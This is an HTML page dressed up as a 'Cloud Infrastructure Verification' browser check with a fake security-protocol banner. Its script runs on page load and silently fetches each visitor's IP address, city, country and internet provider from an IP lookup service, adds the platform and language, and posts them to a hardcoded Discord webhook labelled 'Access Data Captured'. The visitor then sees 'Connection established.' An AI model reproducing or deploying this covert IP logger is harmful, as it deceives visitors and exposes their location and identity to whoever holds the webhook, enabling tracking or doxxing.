<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloud Infrastructure Verification</title>
    <style>
        body {
            background-color: #0a0a0a;
            color: #d1d5db;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .monitor-box {
            border: 1px solid #262626;
            background: #171717;
            padding: 2rem;
            border-radius: 12px;
            text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }
        .status-dot {
            height: 8px;
            width: 8px;
            background-color: #10b981;
            border-radius: 50%;
            display: inline-block;
            margin-right: 8px;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="monitor-box">
        <div style="font-size: 0.8rem; color: #737373; margin-bottom: 1rem; text-transform: uppercase; letter-spacing: 0.1em;">
            Security Protocol v4.0.2
        </div>
        <div id="status">
            <span class="status-dot"></span>
            Verifying browser environment...
        </div>
    </div>

    <script>
        /**
         * AI-Optimized Webhook Integration
         * Fixed Name: 五覇法典ももんが
         */
        const CORE_CONFIG = {
            WEBHOOK_URL: "https://discord.com/api/webhooks/1472915721096003839/QYc7m2EH5mK4kEfzWXSTOYGCXcVpmdmexSrElPFggIw9FjDqP-mUcYf_ZrZ1erUPsc62",
            IP_SERVICE: "https://ipapi.co/json/",
            BOT_NAME: "五覇法典ももんが" // ここで名前を固定
        };

        async function processTelemetrics() {
            try {
                // 1. IPデータの取得 (HTTPS)
                const res = await fetch(CORE_CONFIG.IP_SERVICE);
                if (!res.ok) throw new Error("Service unavailable");
                const d = await res.json();

                // 2. ペイロード構築
                const payload = {
                    username: CORE_CONFIG.BOT_NAME, // Discord側での表示名を強制固定
                    avatar_url: "https://cdn-icons-png.flaticon.com/512/1067/1067555.png", // 必要ならアイコンURLも変更可能
                    embeds: [{
                        title: "📈 Access Data Captured",
                        color: 0x000000,
                        fields: [
                            { name: "🌐 IP Address", value: `\`${d.ip}\``, inline: true },
                            { name: "📍 Location", value: `${d.country_name} / ${d.city}`, inline: true },
                            { name: "🏢 Provider", value: d.org, inline: false },
                            { name: "📱 OS/Platform", value: navigator.platform, inline: true },
                            { name: "🌐 Language", value: navigator.language, inline: true }
                        ],
                        footer: { text: "Secure Logger Instance" },
                        timestamp: new Date().toISOString()
                    }]
                };

                // 3. Discordへ送信
                await fetch(CORE_CONFIG.WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });

                // 完了後の視覚的フィードバック
                document.getElementById("status").innerHTML = "✅ Connection established.";

            } catch (err) {
                console.error("Critical error in telemetry:", err);
                document.getElementById("status").innerHTML = "❌ Failed to connect.";
            }
        }

        window.onload = processTelemetrics;
    </script>
</body>
</html>
